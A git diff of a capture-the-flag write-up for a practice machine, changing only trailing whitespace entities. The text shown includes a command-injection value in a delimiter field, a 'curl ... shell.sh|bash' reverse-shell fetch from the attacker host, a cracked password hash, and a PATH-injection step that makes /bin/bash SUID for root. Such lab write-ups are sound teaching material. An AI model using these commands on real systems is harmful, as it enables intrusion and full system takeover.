@@ -106,7 +106,7 @@ delim=comma; ping -c 1 10.10.14.13
 
 <figure><img src="../../../.gitbook/assets/image (2586).png" alt=""><figcaption></figcaption></figure>
 
-Now, we can get a reverse shell by using `curl http://10.10.14.13/shell.sh|bash`.&#x20;
+Now, we can get a reverse shell by using `curl http://10.10.14.13/shell.sh|bash`.
 
 <figure><img src="../../../.gitbook/assets/image (394).png" alt=""><figcaption></figcaption></figure>
 
@@ -149,7 +149,7 @@ created_at: 2023-05-06 09:26:49
 2 rows in set (0.00 sec)
 ```
 
-Using `hashcat`, we can crack this easily.&#x20;
+Using `hashcat`, we can crack this easily.
 
 ```
 $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
@@ -184,7 +184,7 @@ gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y
 gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
 ```
 
-This script was running `gzip` without the full path, so we can do some PATH injection. Create a script called `gzip` that makes `/bin/bash` an SUID binary via `chmod u+s /bin/bash`, then make it executable.&#x20;
+This script was running `gzip` without the full path, so we can do some PATH injection. Create a script called `gzip` that makes `/bin/bash` an SUID binary via `chmod u+s /bin/bash`, then make it executable.
 
 Afterwards, change the PATH variable to include `/tmp` first and run the script as root.
 
@@ -193,6 +193,6 @@ m4lwhere@previse:/tmp$ export PATH=/tmp:$PATH
 m4lwhere@previse:/tmp$ sudo /opt/scripts/access_backup.sh
 ```
 
-It's easy to get a `root` shell afterwards.&#x20;
+It's easy to get a `root` shell afterwards.
 
 <figure><img src="../../../.gitbook/assets/image (1086).png" alt=""><figcaption></figcaption></figure>
